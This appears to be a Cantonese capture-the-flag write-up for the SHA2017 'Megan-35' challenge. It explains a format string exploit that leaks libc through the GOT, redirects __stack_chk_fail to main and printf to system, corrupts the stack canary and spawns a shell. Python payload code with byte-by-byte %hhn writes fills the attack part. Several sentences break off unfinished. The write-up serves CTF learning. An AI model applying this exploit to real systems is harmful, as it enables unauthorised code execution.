# SHA2017 Megan-35

呢題其實唔難,如果比賽個陣熟canary,根本就係coding challenge同小學生加減數問題:0)

呢條問題主要係一個input megan-35 encrypted message,output decrypted message 嘅service

有format string bug


由於佢有開canary,我地可以寫爛個canary,check sec fail同printf, 跳返去main再input /bin/sh, run system("/bin/sh")


首先用ida搵 canary address:


![alt text](1.png)



用stack dump數到第135號位save左 canary,71號位開始save printf of decrypted message



![alt text](2.png)



由於提供libc同冇aslr,所以可以利用GOT再寫printf去71號位,揾libc offset,再搵返system server side address:


![alt text](3.png)

不過直接讀只會出返個所以要再

```python
#dereference by %s

payload+='%p'*70+'--'+'%s'

printf_addr=int(r.recv(1024).split('--')[-1][:4][::-1].encode('hex'),16)

```

之後就寫做






最後一步


一眼就見到號位有個近似嘅物體


減返跳去canary($ebp-0x1c)



Format String payload

```python
#Step 1 write stack chk fail to main
payload =p32(stack_check_fail_got)
payload+=p32(stack_check_fail_got+1)
payload+=p32(stack_check_fail_got+2)
payload+=p32(stack_check_fail_got+3)

#Step 2 write printf to system
payload+=p32(printf_got)
payload+=p32(printf_got+1)
payload+=p32(printf_got+2)
payload+=p32(printf_got+3)

#test arg 139
#-0x34
#address of canary
#send %139$p
#return 0xffffddd0
#from gdb, we know the difference between canary and %139$p is 0x34,
#so 0xffffdd9c=0xffffddd0-0x34

payload+=p32(0xffffdd9c)

fmt= '%188c%71$hhn'# 0xe0-36=
fmt+='%164c%72$hhn'# 0x84-0xe0=
fmt+='%128c%73$hhn'# 0x04-0x84=
fmt+='%4c%74$hhn'# 0x08-0x04

#system_server=0xf7e53940
fmt+='%56c%75$hhn'# 0x40-0x08=
fmt+='%249c%76$hhn'# 0x39-0x40=
fmt+='%172c%77$hhn'# 0xe5-0x39=
fmt+='%18c%78$hhn'  # 0xf7-0xe5=

#9 write canary
fmt+='%11c%79$hhn'
```

由於hhn 係根據%之前string 嘅length,再寫strelen去個address

加上canary頭一個byte係 \x00,所以求其寫d非0嘅野上去已經可以corrupt佢




Reference
==========================
1.http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/

2.https://hgarrereyn.gitbooks.io/th3g3ntl3man-ctf-writeups/content/2017/SHA2017CTF/problems/pwnable/megan-35/

3.https://b0tchsec.com/2017/sha2017/megan-35

4.https://chung96vn.blogspot.hk/2017/08/sha2017-write-up-pwn-200.html

5.https://github.com/L4ys/CTF/blob/master/sha_2017/pwn200/exp.py

